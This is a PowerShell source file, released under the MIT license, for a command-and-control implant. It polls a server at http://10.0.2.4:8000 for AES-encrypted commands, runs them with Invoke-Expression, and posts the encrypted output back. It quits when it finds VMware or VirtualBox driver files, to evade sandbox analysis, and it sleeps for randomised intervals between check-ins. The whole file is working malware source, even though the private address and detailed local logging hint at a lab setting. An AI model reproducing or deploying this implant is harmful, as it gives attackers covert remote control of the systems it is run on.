######################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################


$LogDir = "C:\c2_Log"
$LogFile = "$LogDir\logfile.txt"
$AgentIDFile = "$LogDir\AgentID.txt"

Function Log-Message {
    param (
        [string]$Message
    )
    if (-not (Test-Path -Path $LogDir)) {
        New-Item -Path $LogDir -ItemType Directory
    }
    $Timestamp = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
    $LogEntry = "$Timestamp - $Message"
    Add-Content -Path $LogFile -Value $LogEntry
}

Function Get-EncryptionKey {
    param ([string]$Base64Key)
    Log-Message "Getting encryption key from Base64 string: $Base64Key"

    try {
        $KeyBytes = [System.Convert]::FromBase64String($Base64Key)
    } catch {
        Log-Message "Error converting Base64 string to byte array: $_"
        throw "Invalid key format."
    }

    if ($KeyBytes.Length -ne 16 -and $KeyBytes.Length -ne 32) {
        throw "Invalid key size. Expected 128-bit (16 bytes) or 256-bit (32 bytes)."
    }
    Log-Message "Encryption key obtained successfully."
    return $KeyBytes
}

Function Encrypt-Data {
    param (
        [string]$Data,
        [byte[]]$Key
    )
    try {
        Log-Message "Starting encryption..."
        $Aes = [System.Security.Cryptography.AesManaged]::new()
        $Aes.Key = $Key
        $Aes.GenerateIV()
        $Encryptor = $Aes.CreateEncryptor($Aes.Key, $Aes.IV)

        $Bytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
        $EncryptedBytes = $Encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)

        Log-Message "Data encrypted successfully."
        return $Aes.IV + $EncryptedBytes  # Raw binary output
    } catch {
        Log-Message "Error in Encrypt-Data: $_"
        throw
    }
}

Function Decrypt-Data {
    param (
        [byte[]]$Data,
        [byte[]]$Key
    )
    try {
        Log-Message "Starting decryption..."
        $Aes = [System.Security.Cryptography.AesManaged]::new()
        $Aes.Key = $Key
        $IV = $Data[0..15]
        $EncryptedBytes = $Data[16..($Data.Length - 1)]

        $Decryptor = $Aes.CreateDecryptor($Aes.Key, $IV)
        $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)

        Log-Message "Data decrypted successfully."
        return [System.Text.Encoding]::UTF8.GetString($DecryptedBytes)
    } catch {
        Log-Message "Error in Decrypt-Data: $_"
        throw
    }
}

Function Check-In {
    param (
        [string]$ServerURL,
        [string]$AgentID,
        [byte[]]$Key
    )
    try {
        Log-Message "Starting check-in process..."
        $Body = @{ AgentID = $AgentID } | ConvertTo-Json
        Log-Message "Sending check-in request to $ServerURL"
        $Response = Invoke-RestMethod -Uri "$ServerURL/checkin" -Method Post -Body $Body -ContentType "application/json"
        Log-Message "Received check-in response: $($Response | ConvertTo-Json -Depth 100)"

        if ($null -eq $Response.key -or [string]::IsNullOrEmpty($Response.key)) {
            throw "Received empty HexKey from server."
        }

        $Base64Key = $Response.key
        Log-Message "Received Base64Key: $Base64Key"

        $Key = Get-EncryptionKey -Base64Key $Base64Key
        Log-Message "Encryption key obtained."

        return $Key, $Response.data
    } catch {
        Log-Message "Error in Check-In: $_"
        throw
    }
}

Function Send-Result {
    param (
        [string]$ServerURL,
        [string]$AgentID,
        [string]$Result,
        [byte[]]$Key
    )
    try {
        Log-Message "Encrypting result..."
        $EncryptedResult = Encrypt-Data -Data $Result -Key $Key
        $Body = @{
            AgentID = $AgentID
            Result = [System.Convert]::ToBase64String($EncryptedResult)
        } | ConvertTo-Json
        Log-Message "Sending result to $ServerURL"
        $Response = Invoke-RestMethod -Uri "$ServerURL/result" -Method Post -Body $Body -ContentType "application/json"
        Log-Message "Result sent successfully: $($Response | ConvertTo-Json -Depth 100)"
    } catch {
        Log-Message "Error in Send-Result: $_"
        throw
    }
}

Function Execute-Command {
    param (
        [string]$ServerURL,
        [string]$AgentID,
        [byte[]]$Key,
        [string]$Command
    )
    try {
        Log-Message "Decrypting command..."
        $DecryptedCommand = Decrypt-Data -Data ([System.Convert]::FromBase64String($Command)) -Key $Key
        Log-Message "Decrypted Command: $DecryptedCommand"
        if ($DecryptedCommand -ne "NoCommand") {
            Log-Message "Executing command: $DecryptedCommand"
            # Execute PowerShell command directly and convert the result to a string
            $Result = Invoke-Expression -Command $DecryptedCommand | Out-String
            Log-Message "Command execution result: $Result"
            Log-Message "Sending result..."
            Send-Result -ServerURL $ServerURL -AgentID $AgentID -Result $Result -Key $Key
        } else {
            Log-Message "No commands to execute."
        }
    } catch {
        Log-Message "Error in Execute-Command: $_"
    }
}

Function Is-Sandbox {
    Log-Message "Checking for sandbox environment..."
    $sandboxFiles = @("C:\WINDOWS\system32\drivers\Vmmouse.sys", "C:\WINDOWS\system32\drivers\vm3dgl.dll", "C:\WINDOWS\system32\drivers\vmhgfs.sys", "C:\WINDOWS\system32\drivers\VBoxMouse.sys")
    foreach ($file in $sandboxFiles) {
    if (Test-Path -Path $file) {
             Log-Message "Sandbox detected: $file exists"
             return $true
         }
     }
     Log-Message "No sandbox detected."
    return $false
}

Function Polymorphic-Sleep {
    param (
        [int]$BaseSleepTime,
        [double]$Variance
    )
    $Random = [System.Random]::new()
    $ActualSleepTime = $BaseSleepTime + ($Variance * $Random.NextDouble())
    Log-Message "Sleeping for $ActualSleepTime seconds..."
    Start-Sleep -Seconds $ActualSleepTime
}

Function Main-Loop {
    param (
        [string]$ServerURL,
        [string]$AgentID,
        [byte[]]$Key
    )
    while ($true) {
        try {
            if (Is-Sandbox) {
                Log-Message "Sandbox environment detected, aborting..."
                break
            }

            Log-Message "Checking in..."
            $Key, $Command = Check-In -ServerURL $ServerURL -AgentID $AgentID -Key $Key
            Execute-Command -ServerURL $ServerURL -AgentID $AgentID -Key $Key -Command $Command
            Polymorphic-Sleep -BaseSleepTime 5 -Variance 10
        } catch {
            Log-Message "Error in main loop: $_"
        }
    }
}

# Main script logic
try {
    if (-not (Test-Path -Path $LogDir)) {
        New-Item -Path $LogDir -ItemType Directory
    }
    $ServerURL = "http://10.0.2.4:8000"
    if (-not (Test-Path -Path $AgentIDFile)) {
        $AgentID = [guid]::NewGuid().ToString()
        $AgentID | Out-File -FilePath $AgentIDFile
    } else {
        $AgentID = Get-Content -Path $AgentIDFile
    }
    Log-Message "Using AgentID: $AgentID"
    $Key = $null
    Main-Loop -ServerURL $ServerURL -AgentID $AgentID -Key $Key
} catch {
    Log-Message "An error occurred in the main script: $_"
}
